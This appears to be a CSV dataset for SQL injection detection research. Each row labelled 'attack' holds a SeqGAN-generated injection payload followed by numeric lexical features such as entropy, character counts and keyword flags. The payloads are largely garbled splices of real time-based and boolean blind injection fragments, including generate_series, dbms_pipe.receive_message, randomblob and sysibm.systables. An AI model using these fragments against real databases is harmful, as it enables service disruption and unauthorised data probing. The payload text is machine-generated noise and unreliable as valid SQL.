label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"%%%%$from%%$' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'wandly h{ ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '@@4641likeDmu'    c%'  )   and 3202  =  like  (  '.4212""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""{%11""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""%""Jy103p"" like """"  =  ""4641%5333"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""fk%p	c%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""%""z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'$%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'8635%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'W#`%2633          )       (,5u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  =  'f%%%%""  =  ""55u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'E""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   """" like ""3902""  =  ""'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '0""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""w84077471*u%%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'7' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'1"" like ""4212(%%b\g""  =  ""N	>' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ''+  (  select 'u146%%%""  =  ""nullb' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1295,3223.0,62.0,4.102838282841903,978.0,511.0,1252.0,482.0,0.3034439962767608,0.15854793670493328,0.38845795842382874,0.1495501085944772,51.0,32.0,0.0,2.0,24.0,50.0,0.0,197.0,38.0,19.0,26.0,101.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,20.0,0.0,17.0,20.0,36.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,94.0
attack,"1%%%'  )   and 3202  =  like  (  'u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''+  (  select 'fkq4212'  =  '%%$' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""463902%%%'  =  '%%%%%'  =  ')%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z+5(7417b%%%9467471f%53335000000""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""46     8635120%%%%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +' --%kzgQiY2where4212uh' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'F' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'b""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""g46 ""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'8Rf_"" like """"  =  ""char""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""Xf""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""$hj""   )    )     =     (    (   ""'  =  '{Fq'  )   and 3202  =  like  (  'u67u""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""if}40624641""qr%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'
""vfvh""%2367   3018%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'8635,0r'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'B' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '2633%""  =  ""4123500000000%",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1296,3470.0,61.0,4.017246204032407,973.0,599.0,1382.0,516.0,0.28040345821325646,0.17262247838616715,0.3982708933717579,0.14870317002881844,58.0,29.0,2.0,1.0,26.0,58.0,0.0,220.0,39.0,23.0,25.0,114.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,21.0,0.0,19.0,20.0,41.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,102.0
attack,"1%%%%%%%%%!' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'D4062' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'Iz'  )   and 3202  =  like  (  'v%'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '472846qavz3902""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""un %%2633%%%M%$1%'  =  '%%%%zkkzgtz%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'@D||n 4212u'hrj2367    rquX' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46#G8407u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46840746A%%%%E' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'D840753339r%$46' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46'  =  '8407%%=%74712367%%'  =  '%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z$' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'4674172367%%%$%%%%%%zg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ']AN'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'HL""  =  ""4123select1%%%%%$3902%46whereu",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1297,2009.0,62.0,4.237926303553296,611.0,375.0,717.0,306.0,0.3041314086610254,0.1866600298656048,0.35689397710303633,0.1523145843703335,39.0,4.0,0.0,0.0,14.0,34.0,0.0,108.0,51.0,14.0,16.0,63.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,13.0,0.0,12.0,13.0,21.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,59.0
attack,"1%%%%%101u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%'  =  '46%%%%'  =  '%%%'  =  '%%'  =  '%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   """"   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""    1""  =  ""XO'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '120m%2633'  =  '%%%%%%%""  =  ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'$select%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'O463018='  )   and 3202  =  like  (  'c%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'g120(3018 4123u'qjle'b.%%%2633%%%%%v' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'Xc""   )    )     =     (    (   ""46""  =  ""null&%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'
like'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""1101011%%%$(h9688N3018J41235u%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'U4212m'  )   and 3202  =  like  (  'u8407o9643n4212 """"   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%%%%%%%%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '/z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'q",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1298,2617.0,58.0,4.049503600648633,744.0,428.0,1030.0,415.0,0.28429499426824606,0.16354604508979748,0.3935804356132977,0.15857852502865877,54.0,19.0,0.0,4.0,15.0,46.0,0.0,163.0,60.0,14.0,20.0,79.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,15.0,0.0,13.0,14.0,28.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,71.0
attack,"1%%%%'  =  '%%%%$%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%z    (   %""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%'  =  '%%'  =  '%%%$||=%7471$tb' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'120(%%46         --%%%%%G' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +']5000000g'  =  '%%: 30185000000h' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  =  '4650000008312||chrr(A%%46!i' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'Y7417g'  =  '""   )    )     =     (    (   """"""  =  ""/8407u%%%'  =  '%%%%%'  =  '%%3018' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z?    mhpq""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""120'qjle'%%%%%4123',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'z"" like ""~' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  """"  =  ""~5r'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'T' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""9' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46""  =  """"  =  ""'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  'ey9643""  =  ""$"" like ""%%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'x",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1299,2261.0,59.0,4.000674807703546,592.0,366.0,914.0,389.0,0.2618310482087572,0.16187527642636002,0.4042459088898717,0.17204776647501105,52.0,27.0,2.0,5.0,11.0,44.0,0.0,142.0,52.0,12.0,17.0,78.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,11.0,0.0,11.0,11.0,21.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,55.0
attack,"1%%46X46(,500000000@%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'f]' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'>""y4297qupbf%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'@'  )   and 3202  =  like  (  '5333462633   'qjle'u8407  --    =(    g""   )    )     =     (    (   ""46""  =  """" like ""yi840765p'  =  '%%'  =  '%%%%4123%%%""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wherefu%%3018'\{where)    (   (    (     selectru8407    (   ""    (   3902 u""%""quhr'  =  'j' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''+  (  select '_""%""]PM'  =  '%%%%f%[Q2||||rc%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""vjh' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'like46' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'"" like ""u67
Gvme(    (   %'  )   and 3202  =  like  (  ''  )   and 3202  =  like  (  'u'  (",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1300,2022.0,61.0,4.121409903718872,588.0,340.0,773.0,321.0,0.29080118694362017,0.1681503461918892,0.38229475766567755,0.15875370919881307,44.0,18.0,2.0,0.0,13.0,36.0,0.0,122.0,25.0,15.0,14.0,75.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,13.0,0.0,13.0,12.0,19.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,57.0
attack,"1%%%$,46)   4212""y   where 3018' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""4212        %%%%%%%'  )   and 3202  =  like  (  '",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1301,334.0,43.0,4.233688186123047,125.0,46.0,111.0,52.0,0.37425149700598803,0.1377245508982036,0.3323353293413174,0.15568862275449102,6.0,3.0,0.0,0.0,2.0,5.0,0.0,14.0,12.0,1.0,4.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1%%%%%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""M%9f""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '-)     )    rfwhereh46'  =  'ow8635iu%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'A'  )   and make_set  (  4551  =  6487,6487  )   and   (  '>> 4212v%v%%%%z'  )   and 3202  =  like  (  '$%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'3018^^9643""  =  ""snullf""   )    )     =     (    (   """"m'  )   and 3202  =  like  (  '.%%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""q3018quoz""c%8nullp""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""k46     0where24694212   4212$+%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1302,1325.0,54.0,3.9617486307648977,325.0,217.0,562.0,221.0,0.24528301886792453,0.16377358490566038,0.4241509433962264,0.16679245283018868,22.0,14.0,1.0,1.0,6.0,20.0,0.0,94.0,27.0,8.0,9.0,41.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,4.0,0.0,4.0,4.0,19.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,32.0
attack,"1%%%%$""  =  ""'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'vuh' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'q%%2633'  =  '%3018%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'@x""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""U	xS""   )    )     =     (    (   ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'f%%3018""_8635246"" like ""ww4123'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jJ84074212u%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   '8635",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1303,961.0,49.0,3.884382877490424,253.0,164.0,407.0,137.0,0.26326742976066597,0.17065556711758584,0.42351716961498437,0.1425598335067638,16.0,9.0,0.0,0.0,5.0,15.0,0.0,64.0,11.0,6.0,5.0,24.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,6.0,0.0,4.0,4.0,10.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,24.0
attack,"1%%%%%%46fromy%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +':selecttrb' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'120ey'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%zqvi"" like ""84077471%%%'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   '%R'  =  '4123r%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""!7dgC(1%%%%%%2633>$v'ooloo.lunqu.sy",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1304,917.0,54.0,4.068591493880668,267.0,142.0,360.0,148.0,0.29116684841875684,0.15485278080697928,0.3925845147219193,0.1613958560523446,17.0,6.0,0.0,1.0,4.0,13.0,0.0,59.0,28.0,4.0,6.0,24.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,5.0,0.0,4.0,4.0,8.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
